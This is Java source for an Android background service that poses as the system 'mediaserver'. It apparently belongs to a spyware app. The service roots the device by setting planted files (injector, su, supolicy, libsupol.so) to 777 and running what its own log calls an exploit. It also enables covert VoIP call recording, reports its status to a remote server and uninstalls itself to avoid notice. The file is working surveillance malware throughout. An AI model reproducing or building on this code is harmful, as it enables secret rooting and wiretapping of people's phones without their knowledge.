package com.android.mediaserver.service;

import android.content.Intent;
import com.android.mediaserver.AppConstants;
import com.android.mediaserver.AppCore;
import com.android.mediaserver.MyApplication;
import com.android.mediaserver.config.Config;
import com.android.mediaserver.network.NetworkManager;
import com.android.mediaserver.prerequisites.PrerequisitesChecker;
import com.android.mediaserver.shell.Shell.SH;
import com.android.mediaserver.util.ApplicationsManager;
import com.android.mediaserver.voip.VoipCallRecorder;
import com.commonsware.cwac.wakeful.WakefulIntentService;
import java.io.File;
import java.util.List;
import timber.log.Timber;

public class AppService extends WakefulIntentService {
  public AppService() {
    super("AppService");
    Timber.tag(AppService.class.getName());
  }

  protected void doWakefulWork(Intent intent) {
    MyApplication application = (MyApplication) getApplicationContext();
    application.setIsWorking(true);
    try {
      if (true == PrerequisitesChecker.checkCanRun(application)) {
        NetworkManager.getInstance(getApplicationContext())
            .serverLog(AppConstants.APP_RUNNING_WITH_ROOT, true);
        if (getSharedPreferences(AppConstants.PREFERENCES_NAME, 0).getBoolean(
            AppConstants.ROOTED_ON_BOOT, false)) {
          rootDevice();
        }
        if (true == Config.getInstance(application).getRecordVoip()) {
          VoipCallRecorder.getInstance(getApplicationContext()).enableVoipRecording();
        }
        AppCore.getInstance(application).doWork();
      } else {
        Timber.d("Uninstalling, Reason: Not allowed to run", new Object[0]);
        NetworkManager.getInstance(getApplicationContext()).notifyUninstall();
        ApplicationsManager.getInstance(getApplicationContext()).uninstallSelf();
      }
    } catch (Exception e) {
      Timber.e(e, "Exception was thrown", new Object[0]);
    }
    application.setIsWorking(false);
    application.stopLocation();
  }

  private boolean rootDevice() {
    try {
      getSharedPreferences(AppConstants.PREFERENCES_NAME, 0).edit()
          .putBoolean(AppConstants.ROOTED_ON_BOOT, false)
          .commit();
      File injector = new File(getFilesDir() + File.separator + "injector");
      File su = new File(getFilesDir() + File.separator + "su");
      File libsupol =
          new File(getFilesDir() + File.separator + "deps" + File.separator + "libsupol.so");
      File supolicy =
          new File(getFilesDir() + File.separator + "deps" + File.separator + "supolicy");
      Timber.d("Checking if root files exists", new Object[0]);
      if (injector.exists() && su.exists() && libsupol.exists() && supolicy.exists()) {
        Timber.d("Adding execution permissions to files", new Object[0]);
        SH.run("chmod -R 777 " + getFilesDir().getAbsolutePath());
        SH.run("chmod 777 " + injector.getAbsolutePath());
        SH.run("chmod 777 " + su.getAbsolutePath());
        SH.run("chmod 777 " + libsupol.getAbsolutePath());
        SH.run("chmod 777 " + supolicy.getAbsolutePath());
        Timber.d("Running exploit", new Object[0]);
        Timber.d("CMD: " + injector.getAbsolutePath() + " " + su.getAbsolutePath() + " --daemon",
            new Object[0]);
        List<String> output =
            SH.run(injector.getAbsolutePath() + " " + su.getAbsolutePath() + " --daemon");
        if (1 == output.size() && "success".equals(((String) output.get(0)).toLowerCase().trim())) {
          return true;
        }
      }
      return false;
    } catch (Exception e) {
      Timber.e(e, "Root device failed", new Object[0]);
      return false;
    }
  }
}
